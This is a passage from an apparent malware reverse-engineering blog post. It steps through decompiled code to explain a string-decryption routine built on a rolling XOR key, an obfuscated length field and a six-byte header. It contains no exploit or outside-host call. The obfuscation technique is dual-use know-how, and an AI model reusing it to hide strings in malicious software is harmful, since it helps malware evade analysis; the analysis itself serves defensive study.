</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the function <code>sub_18000ACC8()</code> accepts two arguments: <code>a1</code> (encrypted data) and <code>a2</code> (decrypted string). let&rsquo;s rename these arguments so we can get a better picture of what&rsquo;s going on.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>let&rsquo;s examine the function <code>sub_180008EE4()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_180008EE4</span>(<span style="color:#8be9fd">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function seems to just be incrementing a value that is passed to it, so i can rename it as <code>increment_value()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> increment_value(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>okay, so we&rsquo;re getting closer to figuring out how this cipher function works.</p>
<p>let&rsquo;s take a look at the next line.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>this line takes the first 4 bytes of the memory address that&rsquo;s pointed to by <code>encrypted_string</code> and interprets them as a 4B [32-bit] integer.</p>
<p>basically, the memory address of <code>encrypted_string</code> is cast to a pointer, to a 32-bit integer, and then <code>*</code> retrieves the actual 32-bit value [first 4 bytes] stored at that address. this retrieved value is then stored in the variable <code>v6</code>.</p>
<p>the value of <code>v6</code> is set at the start, so it&rsquo;s clearly important. it&rsquo;s then passed to <code>increment_value(v6)</code> inside the loop, meaning it&rsquo;s being updated or altered for each iteration.</p>
<p>as mentioned earlier, the core of XOR ciphers involves XOR-ing each byte of the plaintext (or encrypted text) with a <strong>key</strong>. check out the following line, that shows an XOR operation between <code>v6</code> and <code>v3</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span></code></pre></div><p>the XOR operation <code>v6 ^ v3</code> produces the decrypted string, which implies that <code>v6</code> is actually the <strong>XOR key</strong>. this is supported by the fact that <code>v6</code> is modified within each iteration of the loop, meaning that the key is being dynamically adjusted as each byte of <code>encrypted_string</code> is processed. [note: this is a common operation in encryption schemes where a rolling or changing key is used for each byte!]</p>
<p>we now have another variable name, and it&rsquo;s an important one! let&rsquo;s rewrite the function again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>xor_key</code> starts at the start of the <code>encrypted_string</code>.</p>
<p>the length of the decrypted string is then calculated. it appears to be calculated by <code>XOR</code>-ing the first byte of the encrypted data with the fifth byte.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>if you recall that the encrypted data appeared as the argument <code>unk_18000FA00</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>sub_18000ACC8((<span style="color:#ff79c6">__int64</span>)<span style="color:#ff79c6">&amp;</span>unk_18000FA00, (<span style="color:#ff79c6">__int64</span>)v9);
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/image-5.png" alt="memory contents"  />
</p>
</p>
<p>examining the memory contents of <code>unk_18000FA00</code> show that the first byte is <code>20h</code> and the fifth byte is <code>30h</code>, so <code>20h ^ 30h</code> gives the length of the decrypted data. the calculation is simple, and can be performed using the python CLI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#bd93f9">0x20</span> <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x30</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">16</span>
</span></span></code></pre></div><p>in this specific case, the length of the decrypted string is 16. let&rsquo;s rename the variables to make it more readable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>decrypted_string_len <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> (<span style="color:#ff79c6">*</span>_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p><code>v5</code> also appears at the start of the loop, and it represents the upper limit of the loop (i.e. the loop runs <code>v5</code> times). from this, we can deduce that <code>v5</code> represents the number of iterations needed to process the entire <code>encrypted_string</code>.</p>
<p>so: the loop iterates <code>v5</code> times, processes <code>v5</code> bytes from <code>encrypted_string</code>, and writes <code>v5</code> bytes to <code>decrypted_string</code>. <code>v5</code> then must represent the number of bytes that the entire function needs to process, and this number of bytes corresponds to the length of <code>decrypted_string</code>.</p>
<p>but why the <code>XOR</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>this might be a way for the function to either obfuscate or verify the length of the data. for example, maybe the length of the encrypted data could be stored in <code>encrypted_string</code> in an obfuscated way to prevent easy detection by reversing simple length indicators? i&rsquo;m not sure.</p>
<p>armed with another variable name, we&rsquo;re closer to deciphering the function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>next, let&rsquo;s take a look at the first appearance of <code>v8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span></code></pre></div><p><code>v8</code> is set to point to the memory address that is 6 bytes beyond the start of <code>encrypted_string</code>. i would suppose that the first 6 bytes of <code>encrypted_string</code> are used for storing metadata, like the XOR key and length, and so <code>v8</code> is supposed to point to the actual data that needs to be decrypted.</p>
<p><code>v8</code> also appears in the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span></code></pre></div><p>could <code>v8</code> be the base address for accessing the encrypted data within the loop? the line looks like it accesses a byte of the encrypted data by adding the loop index <code>i</code> to <code>v8</code>, meaning <code>v8</code> marks the start point of the encrypted portion of <code>encrypted_string</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> start_index_encrypted_string; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    start_index_encrypted_string <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>all that&rsquo;s left is <code>v3</code>. it first appears inside the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span></code></pre></div><p><code>v3</code> is assigned the value of the byte located at <code>start_index_encrypted_string + i</code> (the current byte being processed inside the loop). this byte is retrieved from <code>encrypted_string</code>, starting from the address pointed to by <code>start_index_encrypted_string</code> and advancing by <code>i</code> with each iteration.</p>
<p>jumping slightly ahead, <code>v3</code> is the byte that gets <code>XOR</code>&rsquo;d with <code>xor_key</code> to produce the decrypted byte.</p>
